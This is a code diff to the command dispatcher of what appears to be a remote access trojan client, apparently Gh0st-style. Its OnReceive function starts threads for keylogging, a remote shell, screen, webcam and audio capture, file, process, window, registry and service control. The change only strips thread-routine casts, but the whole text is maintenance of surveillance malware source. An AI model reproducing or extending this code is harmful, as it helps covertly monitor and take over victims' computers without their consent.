@@ -120,7 +120,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 	case COMMAND_KEYBOARD: //键盘记录
 		{
 			m_hThread[m_ulThreadCount++].h = CreateThread(NULL, 0,
-				(LPTHREAD_START_ROUTINE)LoopKeyboardManager,
+				LoopKeyboardManager,
 				&m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
 		}
@@ -128,7 +128,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 	case COMMAND_TALK:
 		{
 			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
-				(LPTHREAD_START_ROUTINE)LoopTalkManager,
+				LoopTalkManager,
 				&m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
 		}
@@ -136,7 +136,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 	case COMMAND_SHELL:
 		{
 			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
-				(LPTHREAD_START_ROUTINE)LoopShellManager,
+				LoopShellManager,
 				&m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
 		}
@@ -144,7 +144,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 	case COMMAND_SYSTEM:       //远程进程管理
 		{
 			m_hThread[m_ulThreadCount++].h = CreateThread(NULL, 0, 
-				(LPTHREAD_START_ROUTINE)LoopProcessManager,
+				LoopProcessManager,
 				&m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
 		}
@@ -152,7 +152,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 	case COMMAND_WSLIST:       //远程窗口管理
 		{
 			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
-				(LPTHREAD_START_ROUTINE)LoopWindowManager,
+				LoopWindowManager,
 				&m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
 		}
@@ -183,7 +183,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 			}
 		    m_hThread[m_ulThreadCount].user = user;
 			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
-				(LPTHREAD_START_ROUTINE)LoopScreenManager,
+				LoopScreenManager,
 				&m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
 		}
@@ -191,7 +191,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 	case COMMAND_LIST_DRIVE :
 		{
 			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
-				(LPTHREAD_START_ROUTINE)LoopFileManager,
+				LoopFileManager,
 				&m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
 		}
@@ -199,7 +199,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 	case COMMAND_WEBCAM:
 		{
 			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
-				(LPTHREAD_START_ROUTINE)LoopVideoManager,
+				LoopVideoManager,
 				&m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
 		}
@@ -207,7 +207,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 	case COMMAND_AUDIO:
 		{
 			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
-				(LPTHREAD_START_ROUTINE)LoopAudioManager,
+				LoopAudioManager,
 				&m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
 		}
@@ -215,7 +215,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 	case COMMAND_REGEDIT:
 		{
 			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
-				(LPTHREAD_START_ROUTINE)LoopRegisterManager,
+				LoopRegisterManager,
 				&m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
 		}
@@ -223,7 +223,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 	case COMMAND_SERVICES:
 		{
 			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
-				(LPTHREAD_START_ROUTINE)LoopServicesManager,
+				LoopServicesManager,
 				&m_hThread[m_ulThreadCount], 0, NULL);
 			break;
 		}
